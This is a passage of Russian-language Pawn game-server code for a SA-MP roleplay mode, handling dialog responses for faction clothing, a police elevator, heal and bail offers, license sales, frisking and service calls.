                            if(PlayerInfo[playerid][pRank] == 3) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            SetPlayerSkin(playerid, JoinPed[45][0]);
						}
					}
		       }
			   else if(PlayerInfo[playerid][pMember] == 16)
			   {
                    switch(listitem)
					{
						case 0:
					 	{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             SetPlayerSkin(playerid, JoinPed[39][0]);
						}
						case 1:
						{
                             if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женчин!");
                             SetPlayerSkin(playerid, JoinPed[41][0]);
						}
						case 2:
						{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] == 4) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[42][0]);
						}
						case 3:
						{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] == 9) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[40][0]);
						}
		           }
			   }
               else if(PlayerInfo[playerid][pMember] == 19)
		       {
					switch(listitem)
					{
						case 0:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            SetPlayerSkin(playerid, JoinPed[11][0]);
						}
					    case 1:
					    {
                            if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женщин!");
                            SetPlayerSkin(playerid, JoinPed[12][0]);
					    }
					}
		       }
		       else if(PlayerInfo[playerid][pMember] == 20)
		       {
                    switch(listitem)
					{
						case 0:
					 	{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             SetPlayerSkin(playerid, JoinPed[39][0]);
						}
						case 1:
						{
                             if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женчин!");
                             SetPlayerSkin(playerid, JoinPed[41][0]);
						}
						case 2:
						{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] == 4) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[42][0]);
						}
						case 3:
						{
                             if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                             if(PlayerInfo[playerid][pRank] == 9) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                             SetPlayerSkin(playerid, JoinPed[40][0]);
						}
		           }
		       }
   		       else if(PlayerInfo[playerid][pMember] == 21)
	           {
                   switch(listitem)
				   {
						case 0:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            SetPlayerSkin(playerid, JoinPed[49][0]);
						}
						case 1:
						{
                            if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Это одежда придназначена для женщин!");
                            SetPlayerSkin(playerid, JoinPed[1][0]);
						}
						case 2:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 2) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[2][0]);
						}
						case 3:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 14) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[3][0]);
						}
						case 4:
						{
                            if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Это одежда придназначена для мужчин!");
                            if(PlayerInfo[playerid][pRank] == 14) return SCM(playerid,COLOR_GREY," Вам не доступна эта одежда!");
                            SetPlayerSkin(playerid, JoinPed[50][0]);
						}
				   }
			   }
		   }
           return true;
		}
	case 1014: // Лифт ЛСПД
		{
			if(response)
			{
				 switch(listitem)
				 {
					  case 0:
					  {
                            if(IsPlayerInRangeOfPoint(playerid,1,1564.7991,-1667.0013,28.3956)) return SCM(playerid, COLOR_GREY, "Вы находитесь на крыше!");
							SetPlayerInterior(playerid,0);
							SetPlayerPos(playerid,1564.9955,-1664.7969,28.3956);
							SetPlayerFacingAngle(playerid, 1.2939);
							SetPlayerVirtualWorld(playerid, 0);
							SetCameraBehindPlayer(playerid);
					  }
					  case 1:
					  {
                            if(IsPlayerInRangeOfPoint(playerid,1,1197.6259,1335.7543,3014.4912)) return SCM(playerid, COLOR_GREY, "Вы находитесь на втором этаже!");
							LoadInterior(playerid);
							SetPlayerInterior(playerid,0);
							SetPlayerPos(playerid,1199.8350,1335.7891,3014.4912);
							SetPlayerFacingAngle(playerid, 270.0857);
							SetPlayerVirtualWorld(playerid, 4);
							SetCameraBehindPlayer(playerid);
					  }
					  case 2:
					  {
                            if(IsPlayerInRangeOfPoint(playerid,1,1194.5950,1335.7698,3011.0005)) return SCM(playerid, COLOR_GREY, "Вы находитесь на первом этаже!");
							LoadInterior(playerid);
							SetPlayerInterior(playerid,0);
							SetPlayerPos(playerid,1196.3566,1335.7762,3011.0005);
							SetPlayerFacingAngle(playerid, 268.4015);
							SetPlayerVirtualWorld(playerid, 4);
							SetCameraBehindPlayer(playerid);
					  }
					  case 3:
					  {
                            if(IsPlayerInRangeOfPoint(playerid,1,1568.6144,-1689.9901,6.2188)) return SCM(playerid, COLOR_GREY, "Вы находитесь в гараже!");
				            SetPlayerInterior(playerid,0);
							SetPlayerPos(playerid,1568.5077,-1692.4446,5.8906);
							SetPlayerFacingAngle(playerid, 177.4515);
							SetPlayerVirtualWorld(playerid, 0);
							SetPVarInt(playerid, "inUchastok", 0);
							SetCameraBehindPlayer(playerid);
					  }
				 }
			}
		}
	case 5522:
		{
			if(!response) return true;
			new Float:tempheal;
			new sendername[MAX_PLAYER_NAME];
			new giveplayer[MAX_PLAYER_NAME];
			GetPlayerHealth(playerid,tempheal);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			GetPlayerName(HealOffer[playerid], giveplayer, sizeof(giveplayer));
			if(tempheal >= 100.0) return SCM(HealOffer[playerid], COLOR_GRAD1, " Этот человек здоров!");
			if(PlayerInfo[playerid][pCash] < HealPrice[playerid]) return SCM(HealOffer[playerid], COLOR_GREY, " У этого человека нет столько денег на руках!");
			PlayerInfo[HealOffer[playerid]][pCash] += HealPrice[playerid];
			PlayerInfo[playerid][pCash] -= HealPrice[playerid];
			PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
			format(string, 64, "~g~+100hp~n~~r~-$%i", HealPrice[playerid]);
			GameTextForPlayer(playerid, string, 5000, 1);
			format(string, 64, "~g~+100hp~n~~g~+$%i", HealPrice[playerid]);
			GameTextForPlayer(HealOffer[playerid], string, 5000, 1);
			SetPlayerHealthAC(playerid, 100);
			PlayerInfo[playerid][pHP] = 100;
			startaddiction[playerid] = 0;
			PlayerInfo[playerid][pNarcoLomka] = 0;
			return true;
		}
	case 6622:
		{
			new sendername[MAX_PLAYER_NAME];
			new giveplayer[MAX_PLAYER_NAME];
			GetPlayerName(playerid, sendername, sizeof(sendername));
			GetPlayerName(FreeOffer[playerid], giveplayer, sizeof(giveplayer));
			if(response)
			{
				if(PlayerInfo[playerid][pCash] < FreePrice[playerid])
				{
					SCM(FreeOffer[playerid], COLOR_GREY, " У этого человека нет столько денег на руках!");
					SCM(playerid, COLOR_GREY, " У вас нет столько денег!");
					return true;
				}
				PlayerInfo[FreeOffer[playerid]][pCash] += FreePrice[playerid];
				PlayerInfo[playerid][pCash] -= FreePrice[playerid];
				format(string, 144, " Адвокат %s выпустил вас за %i вирт!",giveplayer, FreePrice[playerid]);
				SCM(playerid, 0x6495EDFF,string);
				format(string, 144, " Вы выпустили %s за %i вирт!",sendername, FreePrice[playerid]);
				SCM(FreeOffer[playerid], 0x6495EDFF,string);
				SetPlayerInterior(playerid, 0);
				SetPlayerPos(playerid,1553.4962,-1675.2714,16.1953);
				SetPlayerFacingAngle(playerid, 95.0636);
				PlayerInfo[playerid][pJailTime] = 0;
				PlayerInfo[playerid][pMestoJail] = 0;
				format(string, 32, "~g~Freedom");
				PlayerInfo[playerid][pWantedLevel] = 0;
				SetPlayerWantedLevel(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				GameTextForPlayer(playerid, string, 5000, 1);
				return true;
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < FreePrice[playerid])
				{
					SCM(FreeOffer[playerid], COLOR_GREY, " У этого человека нет столько денег в банке!");
					SCM(playerid, COLOR_GREY, " У Вас нет столько денег!");
					return true;
				}
				PlayerInfo[FreeOffer[playerid]][pCash] += FreePrice[playerid];
				PlayerInfo[playerid][pBank] -= FreePrice[playerid];
				format(string, 144, " Адвокат %s выпустил вас за %i вирт!",giveplayer, FreePrice[playerid]);
				SCM(playerid, 0x6495EDFF,string);
				format(string, 144, " Вы выпустили %s за %i вирт!",sendername, FreePrice[playerid]);
				SCM(FreeOffer[playerid], 0x6495EDFF,string);
				SetPlayerInterior(playerid, 0);
				SetPlayerPos(playerid,1553.4962,-1675.2714,16.1953);
				SetPlayerFacingAngle(playerid, 95.0636);
				PlayerInfo[playerid][pJailTime] = 0;
				PlayerInfo[playerid][pMestoJail] = 0;
				format(string, 32, "~g~Freedom");
				PlayerInfo[playerid][pWantedLevel] = 0;
				SetPlayerWantedLevel(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				GameTextForPlayer(playerid, string, 5000, 1);
				return true;
			}
		}
	case 12:
		{
			if(!response) return SCM(playerid, COLOR_LIGHTRED, "Вы были отключены от сервера! Чтобы выйти введите /q(uit)"),Kick(playerid);
			PEfir[playerid] = 999;
			Pefir[playerid] = 0;
			new rulesdialogg[1324];
			format(rulesdialogg,sizeof(rulesdialogg), "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
			RulesMSGG[0],RulesMSGG[1],RulesMSGG[2],RulesMSGG[3],RulesMSGG[4],RulesMSGG[5],RulesMSGG[6],RulesMSGG[7],RulesMSGG[8],RulesMSGG[9],RulesMSGG[10],RulesMSGG[11],RulesMSGG[12],RulesMSGG[13],RulesMSGG[14],RulesMSGG[15],RulesMSGG[16],RulesMSGG[17],RulesMSGG[18],RulesMSGG[19],RulesMSGG[20],RulesMSGG[21]);
			ShowPlayerDialogEx(playerid,2626,DIALOG_STYLE_MSGBOX, "{AE443D}Регистрация | {FFFFFF}Правила Сервера", rulesdialogg, "Согласен", "Выйти");
			return true;
		}
	case 1945:
		{
			if(strlen(inputtext) > 0)
			{
                ShowPlayerDialogEx(playerid,2625,DIALOG_STYLE_INPUT, "{AE443D}Регистрация | {FFFFFF}Реферальная система", "Введите ник пригласившиго вас на сервер, пригласивший вас человек получит от вас 100.000$", "Далее", "Пропуск");
				strmid(PlayerInfo[playerid][pEmail], inputtext, 0, strlen(inputtext), strlen(inputtext)+5);
			}
			else
			{
				SCM(playerid, COLOR_GREY, " Длина должна быть от 1 до 64 символов");
 				format(string,527, "{FFFFFF}Введите ваш настоящую электронную почту для безопастности\n{FFA500}Для чего нужна электронная почта?\n\n{FFA500}- {FFFFFF}Для подтверждения вашего личного аккаунта\n{FFA500}- {FFFFFF}Для повышения безопастности вашего аккаунта\n{FFA500}- {FFFFFF}Для восстоновления вашего пароля от аккаунта", PlayerInfo[playerid][pName]);
				ShowPlayerDialogEx(playerid,2626,DIALOG_STYLE_INPUT, "{AE443D}Регистрация | {FFFFFF}Электронная почта",string, "Далее", "Пропустить");
			}
			return true;
		}
	case 9500:
		{
			if(!response) DeletePVar(playerid,"Licenses");
			if(GetPVarInt(playerid,"Licenses") == 1)
			{
				if(PlayerInfo[playerid][pCash] < 500) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
				PlayerInfo[playerid][pCash]-=GetPVarInt(playerid,"MoneyLicenses");
				PlayerInfo[GetPVarInt(playerid,"PlayerSell")][pPayCheck]+=GetPVarInt(playerid,"MoneyLicenses")/70;
				format(string, 144, "Игрок %s приобрел водительские права. Сумма добавлена к зарплате.",PlayerInfo[playerid][pName]);
				SCM(GetPVarInt(playerid,"PlayerSell"), 0x6495EDFF, string);
				PlayerInfo[playerid][pCarLic] = 1;
				SCM(playerid, 0x6495EDFF, "Вы успешно приобрели водительские права.");
				foreach(i)
				{
					if(PlayerInfo[i][pMember] == 11)
					{
						if(PlayerInfo[i][pRank] == 8) PlayerInfo[i][pPayCheck]+=GetPVarInt(playerid,"MoneyLicenses")/95;
						else if(PlayerInfo[i][pRank] == 9) PlayerInfo[i][pPayCheck]+=GetPVarInt(playerid,"MoneyLicenses")/92;
						else if(PlayerInfo[i][pRank] == 10) PlayerInfo[i][pPayCheck]+=GetPVarInt(playerid,"MoneyLicenses")/90;
					}
				}
			}
			else if(GetPVarInt(playerid,"Licenses") == 2)
			{
				if(PlayerInfo[playerid][pCash] < 10000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
				PlayerInfo[playerid][pCash]-=10000;
				PlayerInfo[GetPVarInt(playerid,"PlayerSell")][pPayCheck]+=10000/70;
				format(string, 144, "Игрок %s приобрел лицензию на воздушный траспорт. Сумма добавлена к зарплате.",PlayerInfo[playerid][pName]);
				SCM(GetPVarInt(playerid,"PlayerSell"), 0x6495EDFF, string);
				PlayerInfo[playerid][pFlyLic] = 1;
				SCM(playerid, 0x6495EDFF, "Вы успешно приобрели лицензию.");
				foreach(i)
				{
					if(PlayerInfo[i][pMember] == 11)
					{
						if(PlayerInfo[i][pRank] == 8) PlayerInfo[i][pPayCheck]+=10000/95;
						else if(PlayerInfo[i][pRank] == 9) PlayerInfo[i][pPayCheck]+=10000/92;
						else if(PlayerInfo[i][pRank] == 10) PlayerInfo[i][pPayCheck]+=10000/90;
					}
				}
			}
			else if(GetPVarInt(playerid,"Licenses") == 3)
			{
				if(PlayerInfo[playerid][pCash] < 2000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
				PlayerInfo[playerid][pCash]-=2000;
				PlayerInfo[GetPVarInt(playerid,"PlayerSell")][pPayCheck]+=2000/70;
				format(string, 144, "Игрок %s приобрел лицензию на рыболовство. Сумма добавлена к зарплате.",PlayerInfo[playerid][pName]);
				SCM(GetPVarInt(playerid,"PlayerSell"), 0x6495EDFF, string);
				PlayerInfo[playerid][pFishLic] = 1;
				SCM(playerid, 0x6495EDFF, "Вы успешно приобрели лицензию.");
				foreach(i)
				{
					if(PlayerInfo[i][pMember] == 11)
					{
						if(PlayerInfo[i][pRank] == 8) PlayerInfo[i][pPayCheck]+=2000/95;
						else if(PlayerInfo[i][pRank] == 9) PlayerInfo[i][pPayCheck]+=2000/92;
						else if(PlayerInfo[i][pRank] == 10) PlayerInfo[i][pPayCheck]+=2000/90;
					}
				}
			}
			else if(GetPVarInt(playerid,"Licenses") == 4)
			{
				if(PlayerInfo[playerid][pCash] < 5000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
				PlayerInfo[playerid][pCash]-=5000;
				PlayerInfo[GetPVarInt(playerid,"PlayerSell")][pPayCheck]+=5000/70;
				format(string, 144, "Игрок %s приобрел лицензию на морской траспорт. Сумма добавлена к зарплате.",PlayerInfo[playerid][pName]);
				SCM(GetPVarInt(playerid,"PlayerSell"), 0x6495EDFF, string);
				PlayerInfo[playerid][pBoatLic] = 1;
				SCM(playerid, 0x6495EDFF, "Вы успешно приобрели лицензию.");
				foreach(i)
				{
					if(PlayerInfo[i][pMember] == 11)
					{
						if(PlayerInfo[i][pRank] == 8) PlayerInfo[i][pPayCheck]+=5000/95;
						else if(PlayerInfo[i][pRank] == 9) PlayerInfo[i][pPayCheck]+=5000/92;
						else if(PlayerInfo[i][pRank] == 10) PlayerInfo[i][pPayCheck]+=5000/90;
					}
				}
			}
			else if(GetPVarInt(playerid,"Licenses") == 5)
			{
				if(PlayerInfo[playerid][pCash] < 50000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
				PlayerInfo[playerid][pCash]-=50000;
				PlayerInfo[GetPVarInt(playerid,"PlayerSell")][pPayCheck]+=50000/70;
				format(string, 144, "Игрок %s приобрел лицензию на оружие. Сумма добавлена к зарплате.",PlayerInfo[playerid][pName]);
				SCM(GetPVarInt(playerid,"PlayerSell"), 0x6495EDFF, string);
				PlayerInfo[playerid][pGunLic] = 1;
				SCM(playerid, 0x6495EDFF, "Вы успешно приобрели лицензию.");
				foreach(i)
				{
					if(PlayerInfo[i][pMember] == 11)
					{
						if(PlayerInfo[i][pRank] == 8) PlayerInfo[i][pPayCheck]+=50000/95;
						else if(PlayerInfo[i][pRank] == 9) PlayerInfo[i][pPayCheck]+=50000/92;
						else if(PlayerInfo[i][pRank] == 10) PlayerInfo[i][pPayCheck]+=50000/90;
					}
				}
			}
			else if(GetPVarInt(playerid,"Licenses") == 6)
			{
				if(PlayerInfo[playerid][pCash] < 100000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
				PlayerInfo[playerid][pCash]-=100000;
				PlayerInfo[GetPVarInt(playerid,"PlayerSell")][pPayCheck]+=100000/70;
				format(string, 144, "Игрок %s приобрел лицензию на открытие бизнеса. Сумма добавлена к зарплате.",PlayerInfo[playerid][pName]);
				SCM(GetPVarInt(playerid,"PlayerSell"), 0x6495EDFF, string);
				BizzInfo[PlayerInfo[playerid][pPBizzKey]][bLicense] = 1;
				SCM(playerid, 0x6495EDFF, "Вы успешно приобрели лицензию.");
				foreach(i)
				{
					if(PlayerInfo[i][pMember] == 11)
					{
						if(PlayerInfo[i][pRank] == 8) PlayerInfo[i][pPayCheck]+=100000/95;
						else if(PlayerInfo[i][pRank] == 9) PlayerInfo[i][pPayCheck]+=100000/92;
						else if(PlayerInfo[i][pRank] == 10) PlayerInfo[i][pPayCheck]+=100000/90;
					}
				}
			}
			DeletePVar(playerid,"PlayerSell");
			DeletePVar(playerid,"Licenses");
		}
	case 7777:
		{
			if(!response) return DeletePVar(ChosenPlayer[playerid],"PlayerSell");
			new string556[100];
			switch(listitem)
			{
			case 0:
				{
					//if(PlayerInfo[playerid][pCash] < 500) return SCM(playerid, COLOR_GREY, " У вас Недостаточно денег");
					if(PlayerInfo[ChosenPlayer[playerid]][pCarLic] == 1) return SCM(playerid, COLOR_GRAD1, " У данного игрока уже есть вод. права!");
					if(PlayerInfo[ChosenPlayer[playerid]][pLevel] <= 2) SetPVarInt(ChosenPlayer[playerid], "MoneyLicenses",500);
					else if(PlayerInfo[ChosenPlayer[playerid]][pLevel] <= 5) SetPVarInt(ChosenPlayer[playerid], "MoneyLicenses",5000);
					else if(PlayerInfo[ChosenPlayer[playerid]][pLevel] <= 15) SetPVarInt(ChosenPlayer[playerid], "MoneyLicenses",10000);
					else SetPVarInt(ChosenPlayer[playerid], "MoneyLicenses",30000);
					SetPVarInt(ChosenPlayer[playerid], "Licenses",1);
					format(string,256,"Инструктор %s предлагает вам купить водительские права за %i вирт\nВы согласны?",PlayerInfo[playerid][pName],GetPVarInt(ChosenPlayer[playerid], "MoneyLicenses"));
					ShowPlayerDialogEx(ChosenPlayer[playerid], 9500, DIALOG_STYLE_MSGBOX, "Продажа лицензий:",string, "Купить", "Отмена");
					return true;
				}
			case 1:
				{
					//if(PlayerInfo[playerid][pCash] < 10000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
					if(PlayerInfo[ChosenPlayer[playerid]][pFlyLic] == 1) return SCM(playerid, COLOR_GRAD1, " У данного игрока уже есть эта лицензия!");
					SetPVarInt(ChosenPlayer[playerid], "Licenses",2);
					format(string,256,"Инструктор %s предлагает вам купить лицензию на воздушный транспорт за 10000 вирт\nВы согласны?",PlayerInfo[playerid][pName]);
					ShowPlayerDialogEx(ChosenPlayer[playerid], 9500, DIALOG_STYLE_MSGBOX, "Продажа лицензий:",string, "Купить", "Отмена");
					return true;
				}
			case 2:
				{
					//if(PlayerInfo[playerid][pCash] < 2000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
					if(PlayerInfo[ChosenPlayer[playerid]][pFishLic] == 1) return SCM(playerid, COLOR_GRAD1, " У данного игрока уже есть эта лицензия!");
					SetPVarInt(ChosenPlayer[playerid], "Licenses",3);
					format(string,256,"Инструктор %s предлагает вам купить лицензию на раболовство за 2000 вирт\nВы согласны?",PlayerInfo[playerid][pName]);
					ShowPlayerDialogEx(ChosenPlayer[playerid], 9500, DIALOG_STYLE_MSGBOX, "Продажа лицензий:",string, "Купить", "Отмена");
				}
			case 3:
				{
					//if(PlayerInfo[playerid][pCash] < 5000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
					if(PlayerInfo[ChosenPlayer[playerid]][pBoatLic] == 1) return SCM(playerid, COLOR_GRAD1, " У данного игрока уже есть эта лицензия!");
					SetPVarInt(ChosenPlayer[playerid], "Licenses",4);
					format(string,256,"Инструктор %s предлагает вам купить лицензию на морской транспорт за 5000 вирт\nВы согласны?",PlayerInfo[playerid][pName]);
					ShowPlayerDialogEx(ChosenPlayer[playerid], 9500, DIALOG_STYLE_MSGBOX, "Продажа лицензий:",string, "Купить", "Отмена");
					return true;
				}
			case 4:
				{
					//if(PlayerInfo[playerid][pCash] < 50000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
					if(PlayerInfo[ChosenPlayer[playerid]][pGunLic] == 1) return	SCM(playerid, COLOR_GRAD1, " У данного игрока уже есть эта лицензия!");
					SetPVarInt(ChosenPlayer[playerid], "Licenses",5);
					format(string,256,"Инструктор %s предлагает вам купить лицензию на оружие за 50000 вирт\nВы согласны?",PlayerInfo[playerid][pName]);
					ShowPlayerDialogEx(ChosenPlayer[playerid], 9500, DIALOG_STYLE_MSGBOX, "Продажа лицензий:",string, "Купить", "Отмена");
					return true;
				}
			case 5:
				{
					//if(PlayerInfo[playerid][pCash] < 100000) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег");
					if(!BGet(ChosenPlayer[playerid])) return	SCM(playerid, COLOR_GRAD1, " Игрок не имеет бизнеса!");
					SetPVarInt(ChosenPlayer[playerid], "Licenses",6);
					format(string,256,"Инструктор %s предлагает вам купить лицензию на открытие бизнеса за 100000 вирт\nВы согласны?",PlayerInfo[playerid][pName]);
					ShowPlayerDialogEx(ChosenPlayer[playerid], 9500, DIALOG_STYLE_MSGBOX, "Продажа лицензий:",string, "Купить", "Отмена");
					return true;
				}
			case 6:
				{
					if(TakingLesson[ChosenPlayer[playerid]] == 1) return SCM(playerid, COLOR_GRAD1, " Вы уже начинали с этим игроком урок!");
					format(string556, sizeof(string556), "Вы начали урок у %s.",Name(ChosenPlayer[playerid]));
					SCM(playerid, 0x6495EDFF, string556);
					TakingLesson[ChosenPlayer[playerid]] = 1;
					SCM(ChosenPlayer[playerid], 0x6495EDFF, "Инструктор начал с Вами урок по вождению");
					return true;
				}
			case 7:
				{
					if(TakingLesson[ChosenPlayer[playerid]] == 0) return SCM(playerid, COLOR_GRAD1, " Вы не начинали урок с этим игроком!");
					format(string556, sizeof(string556), "Вы завершили урок у %s.",Name(ChosenPlayer[playerid]));
					SCM(playerid, 0x6495EDFF, string556);
					TakingLesson[ChosenPlayer[playerid]] = 0;
					SCM(ChosenPlayer[playerid], 0x6495EDFF, "Инструктор завершил с Вами урок по вождению");
					return true;
				}
			}
		}
	case 7779:
		{
			if(!response) return true;
			new frisks[32];
			strmid(frisks, inputtext, 0, 1);
			new para1 = GetPVarInt(playerid, "FriskID"), frisking[128];
			switch(frisks[0])
			{
			    case 'A':
			    {
			        PlayerInfo[para1][pDrugs] = 0;
			        format(frisking, sizeof(frisking), " %s забрал у %s наркотики", Name(playerid), Name(para1));
			    }
			    case 'B':
			    {
			        PlayerInfo[para1][pMats] = 0;
			        format(frisking, sizeof(frisking), " %s забрал у %s материалы", Name(playerid), Name(para1));
			    }
                case 'C':
				{
				    SCM(playerid, -1, " Вы не можете забрать это");
				}
				case 'D':
				{
					SCM(playerid, -1, " Вы не можете забрать это");
				}
				case 'E':
				{
					SCM(playerid, -1, " Вы не можете забрать это");
				}
				case 'F':
				{
					PlayerInfo[para1][pKeys] = 0;
			        format(frisking, sizeof(frisking), " %s забрал у %s ключи от камеры", Name(playerid), Name(para1));
				}
				case 'J':
				{
					SCM(playerid, -1, " Вы не можете забрать это");
				}
				case 'K':
				{
                    if(PlayerInfo[para1][pCarLic] == 1)
					{
					    PlayerInfo[para1][pCarLic] = 0;
					    format(frisking, sizeof(frisking), " %s забрал у %s водительские права", Name(playerid), Name(para1));
					}
				}
				case 'L':
				{
				    PlayerInfo[para1][pFlyLic] = 0;
				    format(frisking, sizeof(frisking), " %s забрал у %s лицензию на полёты", Name(playerid), Name(para1));
				}
				case 'M':
				{
					PlayerInfo[para1][pBoatLic] = 0;
				    format(frisking, sizeof(frisking), " %s забрал у %s лицензию на лодки", Name(playerid), Name(para1));
				}
				case 'N':
				{
					PlayerInfo[para1][pFishLic] = 0;
				    format(frisking, sizeof(frisking), " %s забрал у %s лицензию на рыболовлю", Name(playerid), Name(para1));
				}
				case 'O':
				{
				    PlayerInfo[para1][pGunLic] = 0;
				    format(frisking, sizeof(frisking), " %s забрал у %s лицензию на оружие", Name(playerid), Name(para1));
				}
				case 'P':
				{
				    DelGun(para1);
				    format(frisking, sizeof(frisking), " %s забрал у %s оружие", Name(playerid), Name(para1));
				}
			}
			if(strlen(frisking) > 0) ProxDetector(30.0, playerid, frisking, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			new strs[32];
		 	new friskings[512];
		 	format(friskings, sizeof(friskings), "Вещи\tКоличество\n");
			if(PlayerInfo[para1][pDrugs] > 0){
			    format(strs, sizeof(strs), "Наркотики\t%i\n",PlayerInfo[para1][pDrugs]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	if(PlayerInfo[para1][pMats] > 0){
			    format(strs, sizeof(strs), "Материалы\t%i\n",PlayerInfo[para1][pMats]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	if(PlayerInfo[para1][pDirectory] == 1){
			    format(strs, sizeof(strs), "Телефонная книга\t%i\n",PlayerInfo[para1][pDirectory]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		    format(strs, sizeof(strs), "CD-Player\t%i\n",1);
			strcat(friskings, strs, sizeof(friskings));
			if(PlayerInfo[para1][pFishes] > 0.0){
			    format(strs, sizeof(strs), "Рыба\t%f\n",PlayerInfo[para1][pFishes]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	if(PlayerInfo[para1][pKeys] > 0){
			    format(strs, sizeof(strs), "Ключи от камеры\t%i\n",PlayerInfo[para1][pKeys]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	if(PlayerInfo[para1][pMushrooms] > 0){
			    format(strs, sizeof(strs), "Грибы\t%i\n",PlayerInfo[para1][pMushrooms]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	if(PlayerInfo[para1][pCarLic] == 1){
			    format(strs, sizeof(strs), "Водительские права\t%i\n",PlayerInfo[para1][pCarLic]);
				strcat(friskings, strs, sizeof(friskings));
            }
		 	if(PlayerInfo[para1][pFlyLic] == 1){
			    format(strs, sizeof(strs), "Лицензия пилота\t%i\n",PlayerInfo[para1][pFlyLic]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	if(PlayerInfo[para1][pBoatLic] == 1){
			    format(strs, sizeof(strs), "Лицензия на лодки\t%i\n",PlayerInfo[para1][pBoatLic]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	if(PlayerInfo[para1][pFishLic] == 1){
			    format(strs, sizeof(strs), "Лицензия на рыболовство\t%i\n",PlayerInfo[para1][pFishLic]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	if(PlayerInfo[para1][pGunLic] == 1){
			    format(strs, sizeof(strs), "Лицензия на оружие\t%i\n",PlayerInfo[para1][pGunLic]);
				strcat(friskings, strs, sizeof(friskings));
		 	}
		 	new bool:label = false;
		 	for(new i = 0; i < 46; i++)
		 	    if(Weapons[para1][i] > 0)
					label = true;
			if(label){
				format(strs, sizeof(strs), "Оружие\t%i\n",1);
				strcat(friskings, strs, sizeof(friskings));
            }
			ShowPlayerDialogEx(playerid, 7779, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Информация | {AE433D}Карманы", friskings, "Забрать", "Отмена");
		}
	case 9508:
	{
	    if(!response) return true;
		new playeridd;
		new st[32];
		sscanf(inputtext, "s[32]s[32]",st, inputtext);
		sscanf(inputtext, "p<[>s[32]s[32]", inputtext, st);
		sscanf(st, "p<]>is[32]", playeridd, inputtext);
		new job[24];
		if((PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty"))
		{
			job = "cop";
		}
		else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22 && GetPVarInt(playerid,"Fraction_Duty"))
        {
			job = "medic";
        }
        else if(PlayerInfo[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty"))
        {
			job = "taxi";
        }
        else if(PlayerInfo[playerid][pJob] == 2)
		{
			job = "mechanic";
		}
		format(string, sizeof(string), "/service ac %s %i", job, playeridd);
		CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
	}
